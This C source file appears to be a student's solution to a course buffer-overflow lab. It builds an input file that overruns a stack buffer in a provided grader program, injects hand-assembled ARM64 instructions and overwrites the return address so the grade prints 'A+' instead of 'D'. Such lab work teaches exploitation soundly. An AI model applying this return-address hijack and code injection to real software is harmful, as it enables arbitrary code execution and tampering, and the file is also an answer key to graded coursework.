/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* author: replaced_author                                             */
/*--------------------------------------------------------------------*/

/*
   this code creates a "dataAplus" file designed to exploit a buffer
   overrun vulnerability in the grader program, compelling it to print
   "A+" instead of "D".

   approach:
   - write a chosen user alias followed by a null terminator.
   - insert sufficient padding ('0' chars) to overflow and reach the return
     address region of the stack.
   - place an 'A' character and some null padding for alignment purposes.
   - inject instructions that load and print 'A', then modify the grade
     variable by replacing 'D' with '+', and jump back into mainline code.
   - overwrite the return address to ensure our custom instructions execute
     instead of returning normally.
*/

/*
   runtime characteristics:
   - no command-line arguments processed.
   - no input from stdin or other streams.
   - writes only to the file "dataAplus".
   - returns 0 on success, or 1 if the file cannot be opened.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* c89 requires variables declared at start of blocks, also constants from analysis */
enum {
    ALIAS_LEN        = 9,        /* length of "AnishKKat" without trailing '\0' */
    OVERFLOW_COUNT   = 10,       /* how many '0' chars to write for overflow */
    ALIGN_NULLS      = 3,        /* number of null bytes for alignment after 'A' */
    ADDR_A_CHAR      = 0x42006c, /* location of 'A' in memory */
    ADDR_INSTR_START = 0x420070, /* start of injected instructions */
    ADDR_PRINTF      = 0x400690, /* address of printf in the grader */
    ADDR_GRADE       = 0x420044, /* address of the 'grade' variable */
    ADDR_BRANCH_BACK = 0x40089c, /* jump back point in main */
    SHIFT_BL         = 2,
    MASK_BL          = 0x03FFFFFF
};

/* this helper creates a BL instruction to call a function at ulTargetAddr from ulCurrentAddr */
static unsigned int MakeBranchLink(unsigned long ulTargetAddr, unsigned long ulCurrentAddr) {
    unsigned int uiOpcode;
    unsigned int uiOffset;
    uiOpcode = 0x94000000;
    uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> SHIFT_BL);
    uiOpcode |= (uiOffset & MASK_BL);
    return uiOpcode;
}

int main(void) {
    /* declare all variables upfront for c89 compliance */
    const char *pszAlias = "AnishKKat";
    FILE *pOutput;
    int iIndex;
    unsigned long ulNewReturn;
    unsigned int uiInstrLoadA;
    unsigned int uiInstrCallPrint;
    unsigned int uiInstrMovPlus;
    unsigned int uiInstrAdrGrade;
    unsigned int uiInstrStorePlus;
    unsigned int uiInstrBranchBack;
    unsigned int uiInstrSet[6]; /* store instructions in an array before writing */
    char cZero;
    char cNull;
    
    /* open output file in binary mode to avoid any translation issues */
    pOutput = fopen("dataAplus", "wb");
    if (pOutput == NULL) {
        fprintf(stderr, "error: unable to open dataAplus for writing.\n");
        return 1;
    }

    /* define common characters once */
    cZero = '0';
    cNull = '\0';

    /* write the user alias plus the terminating null */
    fwrite(pszAlias, 1, ALIAS_LEN, pOutput);
    fputc(cNull, pOutput);

    /* write '0' chars to overflow into the return address region */
    iIndex = 0;
    while (iIndex < OVERFLOW_COUNT) {
        fputc(cZero, pOutput);
        iIndex++;
    }

    /* place 'A', then alignment nulls */
    fputc('A', pOutput);
    iIndex = 0;
    while (iIndex < ALIGN_NULLS) {
        fputc(cNull, pOutput);
        iIndex++;
    }

    /*
       instructions to inject:
       1) adr x0, ADDR_A_CHAR       : load 'A' address into x0 for printf
       2) bl ADDR_PRINTF            : call printf to print 'A'
       3) mov w0, '+'               : load '+' into w0
       4) adr x1, ADDR_GRADE        : address of grade variable into x1
       5) strb w0, [x1]             : store '+' in grade variable, replacing 'D'
       6) b ADDR_BRANCH_BACK        : jump back to main's normal code flow
    */

    uiInstrLoadA     = MiniAssembler_adr(0, ADDR_A_CHAR, ADDR_INSTR_START);
    uiInstrCallPrint = MakeBranchLink(ADDR_PRINTF, ADDR_INSTR_START + 4);
    uiInstrMovPlus   = MiniAssembler_mov(0, '+');
    uiInstrAdrGrade  = MiniAssembler_adr(1, ADDR_GRADE, ADDR_INSTR_START + 12);
    uiInstrStorePlus = MiniAssembler_strb(0, 1);
    uiInstrBranchBack= MiniAssembler_b(ADDR_BRANCH_BACK, ADDR_INSTR_START + 20);

    /* store instructions in an array to write them out together */
    uiInstrSet[0] = uiInstrLoadA;
    uiInstrSet[1] = uiInstrCallPrint;
    uiInstrSet[2] = uiInstrMovPlus;
    uiInstrSet[3] = uiInstrAdrGrade;
    uiInstrSet[4] = uiInstrStorePlus;
    uiInstrSet[5] = uiInstrBranchBack;

    /* write all instructions in a single step */
    fwrite(uiInstrSet, sizeof(unsigned int), 6, pOutput);

    /* overwrite the return address with ADDR_INSTR_START to run injected code */
    ulNewReturn = ADDR_INSTR_START;
    fwrite(&ulNewReturn, sizeof(unsigned long), 1, pOutput);

    fclose(pOutput);
    return 0;
}